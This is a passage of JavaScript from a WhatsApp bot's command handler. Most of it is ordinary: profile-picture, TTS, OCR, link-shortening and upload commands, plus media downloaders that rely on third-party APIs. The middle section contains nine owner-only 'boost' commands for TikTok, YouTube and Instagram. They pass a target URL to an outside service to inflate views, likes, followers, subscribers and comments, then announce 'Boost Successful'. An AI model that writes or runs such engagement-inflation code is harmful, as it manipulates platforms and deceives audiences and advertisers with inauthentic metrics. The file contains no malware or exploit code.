    case 'setmypp': {
      const { qMsg, qType, qKey } = getQuoted(m);
      const ownImg = m.message?.imageMessage;
      let buf = null;
      try {
        if (ownImg) {
          buf = await dlMedia({ imageMessage: ownImg }, m.key);
        } else if (qType === 'imageMessage') {
          buf = await dlMedia({ imageMessage: qMsg.imageMessage }, qKey);
        } else if (args[0]?.startsWith('http')) {
          buf = await getBuffer(args[0]);
        } else { await reply(`Reply to an image or ${prefix}setmypp <url>`); break; }
        if (!buf || buf.length < 100) throw new Error('Image buffer empty');
        let finalBuf = buf;
        try {
          const sharp = require('sharp');
          finalBuf = await sharp(buf).resize(640, 640, { fit: 'cover' }).jpeg({ quality: 90 }).toBuffer();
        } catch { finalBuf = buf; }
        await sock.updateProfilePicture(jid, finalBuf);
        await reply('✅ Profile picture updated.');
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    case 'getpp': {
      const t = getTargetJid(m, args);
      const target = t || `${botNumber}@s.whatsapp.net`;
      try {
        const ppUrl = await sock.profilePictureUrl(target, 'image');
        const r = await axios.get(ppUrl, { responseType: 'arraybuffer', timeout: 10000 });
        await replyImg(Buffer.from(r.data), `🖼 +${normNum(target)}`);
      } catch { await reply('❌ No profile picture or privacy restricted.'); }
      break;
    }

    case 'tts': {
      if (!text) { await reply(`${prefix}tts <text>`); break; }
      if (text.length >= 300) { await reply('❌ Max 300 characters.'); break; }
      await reply('⏳ Generating voice...');
      try {
        const { data } = await axios.post(
          'https://tiktok-tts.weilnet.workers.dev/api/generation',
          { text, voice: 'id_001' },
          { timeout: 15000 }
        );
        if (!data?.data) throw new Error('No audio returned');
        await sock.sendMessage(jid, {
          audio: Buffer.from(data.data, 'base64'),
          mimetype: 'audio/mp4',
        }, { quoted: qchanel });
      } catch (e) { await reply('❌ TTS failed: ' + e.message); }
      break;
    }

    case 'ocr': {
      const { qMsg, qType, qKey } = getQuoted(m);
      const imgMsg = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
      if (!imgMsg) { await reply('Reply to an image.'); break; }
      try {
        const srcKey = m.message?.imageMessage ? m.key : qKey;
        const buf    = await dlMedia({ imageMessage: imgMsg }, srcKey);
        const b64    = buf.toString('base64');
        const r      = await axios.post('https://api.ocr.space/parse/image',
          `base64Image=data:image/jpeg;base64,${b64}&language=eng`,
          { headers: { apikey: 'helloworld', 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 15000 }
        );
        const txt2 = r.data?.ParsedResults?.[0]?.ParsedText || 'No text found.';
        await reply(`📝 OCR:\n${txt2}`);
      } catch { await reply('❌ OCR failed.'); }
      break;
    }

    case 'shorten': {
      const url = args[0];
      if (!url?.startsWith('http')) { await reply(`${prefix}shorten <url>`); break; }
      try {
        const r = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`, { timeout: 8000 });
        await reply(`🔗 ${r.data}`);
      } catch { await reply('❌ Failed.'); }
      break;
    }

    case 'tourl':
case 'upload':
case 'toupload': {
    await reaction('📄');

    const { qMsg: qMsgTU, qType: qTypeTU, qKey: qKeyTU } = getQuoted(m);
    const MEDIA_TYPES = ['imageMessage', 'videoMessage', 'stickerMessage', 'audioMessage', 'documentMessage'];
    const mediaTypeTU = MEDIA_TYPES.find(t2 => qMsgTU?.[t2]);

    if (!qMsgTU || !mediaTypeTU) {
        await sock.sendMessage(jid, {
            text: `❌ Reply to an image, video, sticker, or audio with .tourl`
        }, { quoted: m });
        break;
    }

    try {
        // 1. Download the media
        const buf = await dlMedia(qMsgTU, qKeyTU);
        if (!buf) throw new Error('Media download failed');

        // 2. Upload to Catbox.moe (free, no auth)
        const form = new FormData();
        const ext = mediaTypeTU.replace('Message', '').toLowerCase();
        const filename = `upload_${Date.now()}.${ext === 'sticker' ? 'webp' : ext === 'audio' ? 'mp3' : 'mp4'}`;
        form.append('fileToUpload', buf, filename);
        form.append('reqtype', 'fileupload');

        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0',
            },
            timeout: 30000,
        });

        const link = response.data.trim();
        if (!link || !link.startsWith('https://')) throw new Error('Upload failed');

        // 3. Send the link as a clean reply
        await sock.sendMessage(jid, {
            text: `✅ *Upload Complete!*\n\n🔗 ${link}\n\n📌 Expires: Never`
        }, { quoted: m });

        await reaction('✅');

    } catch (e) {
        console.error('[tourl] Error:', e.message);
        await sock.sendMessage(jid, {
            text: `❌ Upload failed: ${e.message}`
        }, { quoted: m });
    }
    break;
}

case 'tiktokboost':
case 'ttboost': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: video_views, video_likes, followers\n` +
    `Examples:\n${prefix}${cmd} https://www.tiktok.com/@user/video/123456789 | video_views\n` +
    `${prefix}${cmd} https://www.tiktok.com/@username | followers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'video_views').toLowerCase();
  const validTypes = ['video_views', 'video_likes', 'followers'];
  if (!validTypes.includes(type)) {
    return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  }
  if (type === 'followers') {
    const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
    if (!username) return reply('❌ Provide a valid TikTok username or profile URL for followers');
  } else if (!url.includes('tiktok.com/video/')) {
    return reply('❌ For video_views or video_likes, provide a valid TikTok video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing TikTok boost… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/tiktok/boost?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) {
      throw new Error(response.data?.message || 'Unknown error');
    }
    const data = response.data;
    let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('TikTok boost error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'youtubeboost':
case 'ytboost': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: views, likes, subscribers\n` +
    `Examples:\n${prefix}${cmd} https://www.youtube.com/watch?v=... | views\n` +
    `${prefix}${cmd} https://www.youtube.com/@ChannelName | subscribers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'views').toLowerCase();
  const validTypes = ['views', 'likes', 'subscribers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'subscribers') {
    if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
      return reply('❌ For subscribers, provide a valid YouTube channel URL (e.g., https://www.youtube.com/@ChannelName)');
    }
  } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
    return reply('❌ For views/likes, provide a valid YouTube video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing YouTube boost… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/youtube/boost?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('YouTube boost error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'instagramboost2':
case 'igboost2': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: followers, likes, views, comments\n` +
    `Examples:\n${prefix}${cmd} https://www.instagram.com/username | followers\n` +
    `${prefix}${cmd} https://www.instagram.com/p/... | likes`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'followers').toLowerCase();
  const validTypes = ['followers', 'likes', 'views', 'comments'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    if (!url.includes('instagram.com/') && !url.startsWith('@')) {
      return reply('❌ For followers, provide a valid Instagram profile URL or username');
    }
  } else if (!url.includes('instagram.com/p/') && !url.includes('instagram.com/reel/')) {
    return reply('❌ For likes/views/comments, provide a valid post or reel URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing Instagram boost… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/Instagram/boost2?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 Instagram Boost Successful!*\n\n`;
    resultMsg += `📸 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('Instagram boost error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'tiktokboost2':
case 'ttboost2': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: video_views, video_likes, followers\n` +
    `Examples:\n${prefix}${cmd} https://www.tiktok.com/@user/video/... | video_views\n` +
    `${prefix}${cmd} https://www.tiktok.com/@username | followers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'video_views').toLowerCase();
  const validTypes = ['video_views', 'video_likes', 'followers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
    if (!username) return reply('❌ Provide a valid TikTok username or profile URL for followers');
  } else if (!url.includes('tiktok.com/video/')) {
    return reply('❌ For video_views or video_likes, provide a valid TikTok video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing TikTok boost v2… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/tiktok/boost2?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('TikTok boost v2 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'youtubeboost2':
case 'ytboost2': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: views, likes, subscribers\n` +
    `Examples:\n${prefix}${cmd} https://www.youtube.com/watch?v=... | views\n` +
    `${prefix}${cmd} https://www.youtube.com/@ChannelName | subscribers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'views').toLowerCase();
  const validTypes = ['views', 'likes', 'subscribers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'subscribers') {
    if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
      return reply('❌ For subscribers, provide a valid YouTube channel URL');
    }
  } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
    return reply('❌ For views/likes, provide a valid video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing YouTube boost v2… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/youtube/boost2?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('YouTube boost v2 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'instagramboost3':
case 'igboost3': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: followers, likes, views, comments\n` +
    `Examples:\n${prefix}${cmd} https://www.instagram.com/username | followers\n` +
    `${prefix}${cmd} https://www.instagram.com/p/... | likes`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'followers').toLowerCase();
  const validTypes = ['followers', 'likes', 'views', 'comments'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    if (!url.includes('instagram.com/') && !url.startsWith('@')) {
      return reply('❌ For followers, provide a valid Instagram profile URL or username');
    }
  } else if (!url.includes('instagram.com/p/') && !url.includes('instagram.com/reel/')) {
    return reply('❌ For likes/views/comments, provide a valid post or reel URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing Instagram boost v3… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/Instagram/boost3?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 Instagram Boost Successful!*\n\n`;
    resultMsg += `📸 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('Instagram boost v3 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'tiktokboost3':
case 'ttboost3': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: video_views, video_likes, followers\n` +
    `Examples:\n${prefix}${cmd} https://www.tiktok.com/@user/video/... | video_views\n` +
    `${prefix}${cmd} https://www.tiktok.com/@username | followers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'video_views').toLowerCase();
  const validTypes = ['video_views', 'video_likes', 'followers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
    if (!username) return reply('❌ Provide a valid TikTok username or profile URL for followers');
  } else if (!url.includes('tiktok.com/video/')) {
    return reply('❌ For video_views or video_likes, provide a valid TikTok video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing TikTok boost v3… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/tiktok/boost3?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('TikTok boost v3 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'youtubeboost3':
case 'ytboost3': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: views, likes, subscribers\n` +
    `Examples:\n${prefix}${cmd} https://www.youtube.com/watch?v=... | views\n` +
    `${prefix}${cmd} https://www.youtube.com/@ChannelName | subscribers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'views').toLowerCase();
  const validTypes = ['views', 'likes', 'subscribers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'subscribers') {
    if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
      return reply('❌ For subscribers, provide a valid YouTube channel URL');
    }
  } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
    return reply('❌ For views/likes, provide a valid video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing YouTube boost v3… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/youtube/boost3?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('YouTube boost v3 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}
    
    case 'play': {
  const query = text;
  if (!query) {
    await reply(`🎵 *ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 Play*\n\nUsage: ${prefix}play2 [song name]\nExample: ${prefix}play2 faded`);
    break;
  }
  await reaction('🎧');
  await reply(`⏳ *Searching:* ${query}\nGive me a moment...`);
  try {
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/play?query=${encodeURIComponent(query)}&apikey=`,
      { timeout: 60000 }
    );
    const data = response.data;
    if (data.status && data.result?.download_url) {
      const audioRes = await axios.get(data.result.download_url, {
        responseType: 'arraybuffer',
        timeout: 120000,
      });
      const audioBuffer = Buffer.from(audioRes.data);
      await sock.sendMessage(jid, {
        audio: audioBuffer,
        mimetype: 'audio/mpeg',
        fileName: `${data.result.title}.mp3`,
        contextInfo: {
          externalAdReply: {
            thumbnailUrl: data.result.thumbnail,
            title: data.result.title,
            body: `👁️ ${(data.result.views || 0).toLocaleString()} views • ⏱️ ${data.result.duration || 'N/A'}`,
            sourceUrl: data.result.video_url,
            renderLargerThumbnail: true,
            mediaType: 1,
          },
        },
      }, { quoted: m });
      await reaction('✅');
    } else {
      throw new Error('No download URL received');
    }
  } catch (err) {
    console.error('play2 Error:', err);
    await reaction('❌');
    if (err.response?.status === 404) {
      await reply(`❌ Track "${query}" not found. Try a different song.`);
    } else {
      await reply(`⚠️ Music service error. Try again later.`);
    }
  }
  break;
}



    case 'playdoc': {
      const query2 = text;
      if (!query2) { await reply(`🎵 ${prefix}playdoc <song name>`); break; }
      await reaction('⬇️');
      try {
        const yts = require('yt-search');
        const search = await yts(query2);
        const video = search.videos?.[0] || search.all?.[0];
        if (!video) throw new Error('No results found');
        const { data } = await axios.get(
          `https://api.privatezia.biz.id/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('API failed');
        const dlUrl = data.result?.downloadUrl || data.url;
        if (!dlUrl) throw new Error('No download URL');
        await reply(`⬇️ Downloading *${video.title}*...`);
        const dlRes = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 30000 });
        const buf   = Buffer.from(dlRes.data);
        const fname = video.title.replace(/[^\w\s]/g, '').trim() + '.mp3';
        await sock.sendMessage(jid, {
          document: buf,
          mimetype: 'audio/mpeg',
          caption:  ft(`🎵 ${video.title}\n© ${settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'}`, sock),
          fileName: fname,
        }, { quoted: qchanel });
      } catch (e) { await reply('❌ Failed: ' + e.message); }
      break;
    }

    // ── YouTube Video Download ────────────────────────────
    case 'ytmp4': {
      if (!text) { await reply(`${prefix}ytmp4 <YouTube link or title>`); break; }
      await reaction('🎬');
      await reply('⏳ Processing video...');
      try {
        const yts = require('yt-search');
        const isUrl = text.includes('youtu');
        let videoUrl = text;
        let videoTitle = 'video';
        if (!isUrl) {
          const search = await yts(text);
          const v = search.videos?.[0];
          if (!v) throw new Error('No results');
          videoUrl = v.url;
          videoTitle = v.title;
        }
        const { data } = await axios.get(
          `https://api.privatezia.biz.id/api/downloader/ytmp4?url=${encodeURIComponent(videoUrl)}`,
          { timeout: 25000 }
        );
        const dlUrl = data?.result?.downloadUrl || data?.url;
        if (!dlUrl) throw new Error('No video URL');
        await sock.sendMessage(jid, {
          video: { url: dlUrl },
          caption: ft(`🎬 ${videoTitle}`, sock),
          fileName: videoTitle.replace(/[^\w\s]/g,'').trim() + '.mp4',
        }, { quoted: qchanel });
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ── Lyrics ───────────────────────────────────────────
    case 'lyrics': {
      if (!text) { await reply(`${prefix}lyrics <song name>`); break; }
      await reaction('🎤');
      try {
        const { data } = await axios.get(
          `https://some-random-api.com/lyrics?title=${encodeURIComponent(text)}`,
          { timeout: 10000 }
        );
        if (!data?.lyrics) throw new Error('Not found');
        const lrc = data.lyrics.length > 3000 ? data.lyrics.slice(0, 3000) + '...' : data.lyrics;
        await reply(`🎤 *${data.title}*\n👤 ${data.author}\n\n${lrc}`);
      } catch { await reply('❌ Lyrics not found. Try a different song title.'); }
      break;
    }

    // ── Instagram downloader ──────────────────────────────
    case 'instagram':
    case 'ig': {
      const igUrl = args[0];
      if (!igUrl?.includes('instagram.com')) { await reply(`${prefix}instagram <post/reel url>`); break; }
      await reaction('📸');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/instagram?url=${encodeURIComponent(igUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status || !data.result?.url) throw new Error('Failed');
        const r = data.result;
        if (r.type === 'video') {
          await sock.sendMessage(jid, { video: { url: r.url }, caption: ft(r.caption || '📸 Instagram', sock) }, { quoted: qchanel });
        } else {
          await replyImg(r.url, r.caption?.slice(0,200) || '📸 Instagram');
        }
      } catch (e) { await reply('❌ Instagram download failed: ' + e.message); }
      break;
    }

    // ── TikTok downloader ────────────────────────────────
    case 'tiktok':
    case 'tt': {
      const ttUrl = args[0];
      if (!ttUrl?.includes('tiktok.com')) { await reply(`${prefix}tiktok <tiktok video url>`); break; }
      await reaction('🎵');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/tiktok?url=${encodeURIComponent(ttUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status || !data.result?.video) throw new Error('Failed');
        const r = data.result;
        await sock.sendMessage(jid, { video: { url: r.video }, caption: ft(r.title || '🎵 TikTok', sock) }, { quoted: qchanel });
      } catch (e) { await reply('❌ TikTok download failed: ' + e.message); }
      break;
    }

    // ── Facebook downloader ──────────────────────────────
    case 'facebook':
    case 'fb': {
      const fbUrl = args[0];
      if (!fbUrl?.includes('facebook.com') && !fbUrl?.includes('fb.watch')) { await reply(`${prefix}facebook <facebook video url>`); break; }
      await reaction('📘');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/facebook?url=${encodeURIComponent(fbUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('Failed');
        const r = data.result;
        const videoUrl = r?.sd || r?.hd || r?.video;
        if (!videoUrl) throw new Error('No video URL');
        await sock.sendMessage(jid, { video: { url: videoUrl }, caption: ft('📘 Facebook', sock) }, { quoted: qchanel });
      } catch (e) { await reply('❌ Facebook download failed: ' + e.message); }
      break;
    }

    // ── Twitter/X downloader ─────────────────────────────
    case 'twitter':
    case 'x': {
      const twUrl = args[0];
      if (!twUrl?.includes('twitter.com') && !twUrl?.includes('x.com')) { await reply(`${prefix}twitter <tweet/video url>`); break; }
      await reaction('🐦');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/twitter?url=${encodeURIComponent(twUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('Failed');
        const r = data.result;
        const videoUrl = r?.video || r?.url;
        if (!videoUrl) throw new Error('No URL');
        await sock.sendMessage(jid, { video: { url: videoUrl }, caption: ft('🐦 Twitter/X', sock) }, { quoted: qchanel });
      } catch (e) { await reply('❌ Twitter download failed: ' + e.message); }
      break;
    }

    // ── Pinterest downloader ──────────────────────────────
    case 'pinterest': {
      const pinUrl = args[0];
      if (!pinUrl?.includes('pinterest')) { await reply(`${prefix}pinterest <pinterest url>`); break; }
      await reaction('📌');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/pinterest?url=${encodeURIComponent(pinUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('Failed');
        const r = data.result;
        if (r?.video) {
          await sock.sendMessage(jid, { video: { url: r.video }, caption: '📌 Pinterest' }, { quoted: qchanel });
        } else if (r?.image) {
          await replyImg(r.image, '📌 Pinterest');
        } else throw new Error('No media found');
      } catch (e) { await reply('❌ Pinterest download failed: ' + e.message); }
      break;
    }

    // ── Spotify track info ────────────────────────────────
    case 'spotify': {
      if (!text) { await reply(`${prefix}spotify <track name>`); break; }
      await reaction('🎧');
      try {
        const { data } = await axios.get(
          `https://some-random-api.com/others/spotify?q=${encodeURIComponent(text)}`,
          { timeout: 10000 }
        );
        if (!data?.title) throw new Error('Not found');
        const bar = `▓`.repeat(Math.floor((data.duration_ms/100)/60000 * 20)).padEnd(20,'░');
        await replyImg(
          data.album_art,
          `🎧 *${data.title}*\n👤 ${data.artists?.join(', ') || 'Unknown'}\n💿 ${data.album}\n⏱ ${Math.floor(data.duration_ms/60000)}:${String(Math.floor((data.duration_ms%60000)/1000)).padStart(2,'0')}\n\n[${bar}]`
        );
      } catch { await reply('❌ Spotify track not found.'); }
